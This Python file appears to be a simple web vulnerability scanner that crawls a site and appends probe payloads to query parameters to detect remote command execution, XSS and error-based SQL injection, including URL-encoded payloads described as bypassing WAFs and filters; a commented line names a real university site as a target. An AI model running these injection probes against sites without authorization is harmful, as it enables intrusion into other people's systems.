from crawler import Crawler
import re
import urllib
from urllib.request import Request, urlopen, FancyURLopener
import re
import time
from urllib.error import HTTPError
import re

scan_results = []

class colors:
    def __init__(self):
        self.green = "\033[92m"
        self.blue = "\033[94m"
        self.bold = "\033[1m"
        self.yellow = "\033[93m"
        self.red = "\033[91m"
        self.end = "\033[0m"
ga = colors()

class HTTP_HEADER:
    HOST = "Host"
    SERVER = "Server"

def headers_reader(url):
	# This function will print(the server headers such as WebServer OS & Version
    scan_results.append("[!] Fingerprinting the backend Technologies")
    req = Request(url)
    req.add_header("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0")
    opener = urlopen(req)

    if opener.getcode() == 200:
        print(ga.green+" [!] Status code: 200 OK"+ga.end)
        scan_results.append("[!] Status code: 200 OK")
        
    if opener.getcode() == 404:
        print(ga.red+" [!] Page was not found! Please check the URL \n"+ga.end)
        scan_results.append("[!] Page was not found! Please check the URL")
        scan_results.append(' ')
        
        exit()
        
    
	
	
	
    Server = opener.headers.get(HTTP_HEADER.SERVER)

    Host = url.split("/")[2]
    print(ga.green+" [!] Host: " + str(Host) +ga.end)
    scan_results.append("[!] Host: " + str(Host))
    print(ga.green+" [!] WebServer: " + str(Server) +ga.end)
    scan_results.append("[!] WebServer: " + str(Server))



def main_function(url, payloads, check):
    # This function is going to split the url and try the append paylods in every parameter value.
    req = Request(url)
    req.add_header(
        "User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0")
    opener = urlopen(req)
    vuln = 0
    if opener.code == 999:
        # Detetcing the WebKnight WAF from the StatusCode.
        print(ga.red + " [~] WebKnight WAF Detected!"+ga.end)
        scan_results.append("[~] WebKnight WAF Detected!")
        print(ga.red + " [~] Delaying 3 seconds between every request"+ga.end)
        scan_results.append("[~] Delaying 3 seconds between every request")
        time.sleep(3)
    for params in url.split("?")[1].split("&"):
        #sp = params.split("=")[0]
        for payload in payloads:
            #bugs = url.replace(sp, str(payload).strip())
            bugs = url.replace(params, params + str(payload).strip())
            # print(bugs
            # exit()
    
            req = Request(bugs)
            req.add_header(
                "User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0")
            try:
                request = urlopen(req)
                # print(request.getcode())
                html = request.readlines()
                for line in html:
                    line = line.decode("utf-8")
                    checker = re.findall(check, line)
                    if len(checker) != 0:
                        print(ga.red+" [*] Payload Found . . ."+ga.end)
                        scan_results.append("[*] Payload Found . . .")
                        print(ga.red+" [*] Payload: ", payload + ga.end)
                        scan_results.append("[*] Payload: " + payload)
                        print(ga.green+" [!] Code Snippet: " +
                          ga.end + line.strip())
                        scan_results.append(" [!] Code Snippet: " + line.strip())
                        print(ga.blue+" [*] POC: "+ga.end + bugs)
                        scan_results.append("[*] POC: " + bugs)
                        print(ga.green+" [*] Happy Exploitation :D"+ga.end)
                        scan_results.append("[*] Happy Exploitation :D")
                        vuln += 1
            except Exception as e:
                # print("JAQJASJ" + str(e))
                pass
                
    if vuln == 0:
        print(ga.green+" [!] Target is not vulnerable!"+ga.end)
        scan_results.append("[!] Target is not vulnerable!")
    else:
        print(ga.blue+" [!] Congratulations you've found %i bugs :-) " %
              (vuln) + ga.end)

        scan_results.append("[!] Congratulations you've found %i bugs :-) " %
              (vuln))

# Here stands the vulnerabilities functions and detection payloads.


def rce_func(url):
    headers_reader(url)
    print(
        ga.bold+" [!] Now Scanning for Remote Code/Command Execution "+ga.end)
    scan_results.append("[!] Now Scanning for Remote Code/Command Execution ")
    print(ga.blue+" [!] Covering Linux & Windows Operating Systems "+ga.end)
    scan_results.append("[!] Covering Linux & Windows Operating Systems ")
    print(ga.blue+" [!] Please wait ...."+ga.end)
    scan_results.append("[!] Please wait ....")
    # Remote Code Injection Payloads
    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
    # Below is the Encrypted Payloads to bypass some Security Filters & WAF's
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
    # Remote Command Execution Payloads
    payloads += [';uname;', '&&dir',
                 '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    # used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
    check = re.compile(
        "51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    main_function(url, payloads, check)


def xss_func(url):
    print(ga.bold+"\n [!] Now Scanning for XSS "+ga.end)
    scan_results.append(' ')
    scan_results.append("[!] Now Scanning for XSS ")
    print(ga.blue+" [!] Please wait ...."+ga.end)
    scan_results.append("[!] Please wait ....")
    # Paylod zigoo="css();" added for XSS in <a href TAG's
    payloads = [
        '%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
    payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb',
                 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
    check = re.compile('zigoo0<svg|x>x', re.I)
    main_function(url, payloads, check)


def error_based_sqli_func(url):
    print(ga.bold+"\n [!] Now Scanning for Error Based SQL Injection "+ga.end)
    scan_results.append(' ')
    scan_results.append("[!] Now Scanning for Error Based SQL Injection ")

    print(
        ga.blue+" [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases "+ga.end)
    scan_results.append("[!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases ")
    print(ga.blue+" [!] Please wait ...."+ga.end)
    scan_results.append(" [!] Please wait ....")
    # Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'  Yeaa let's bug the query :D :D
    # added chinese char to the SQLI payloads to bypass mysql_real_escape_*
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
                "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile(
        "Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    main_function(url, payloads, check)
 



def work(seedurl):
    results = set()
    crawler = Crawler(seedurl)
    for url in crawler.crawled_urls:
        if "?" in url:
            rce_func(url)
            xss_func(url)
            error_based_sqli_func(url)


    print("\n !! REPORT !! ")
    scan_results.append(' ')
    scan_results.append("!! REPORT !!")
    for malurl in results:
        print(malurl)
        scan_results.append(malurl)
        

# # everything is fine
# seedurl = input('Enter url:')
# seedurl = "http://sw.muet.edu.pk"
# work(seedurl)

# print("\n\n\n\n ARRAY NOW")
# for url in scan_results:
#     print(url)
			
			